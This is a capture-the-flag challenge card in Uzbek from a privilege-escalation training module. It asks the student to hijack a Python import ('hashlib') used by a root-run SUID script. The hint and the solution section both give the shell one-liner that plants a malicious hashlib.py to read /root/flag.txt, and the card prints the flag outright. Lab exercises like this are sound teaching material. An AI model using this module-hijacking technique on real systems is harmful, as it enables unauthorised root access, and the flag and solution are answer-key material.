---
id: 14
title: "CH14: Python SUID Module Hijacking"
module: "Modul 2: PrivEsc & Binary Exploitation"
difficulty: Hard
points: 8
tags: ['python', 'module-hijacking', 'suid', 'privesc']
flag: "HD{python_module_import_hijacking_root_914}"
---

# 🎯 Topshiriq #14: CH14: Python SUID Module Hijacking

## 📌 Metama'lumotlar:
* **Modul:** `Modul 2: PrivEsc & Binary Exploitation`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 8 ball`
* **Teglar:** #python, #module-hijacking, #suid, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
Root nomidan ishlovchi SUID python skripti '/opt/scripts/status.py' ichida 'import hashlib' qiladi. Python qidiruv yo'lidagi (sys.path) ustunlikdan foydalanib 'hashlib.py' ni o'zgartiring.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> echo 'import os; os.system("cat /root/flag.txt")' > hashlib.py && /opt/scripts/status.py

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
echo 'import os; os.system("cat /root/flag.txt")' > hashlib.py && /opt/scripts/status.py
```

---

## 🚩 Maxfiy Flag:
`HD{python_module_import_hijacking_root_914}`
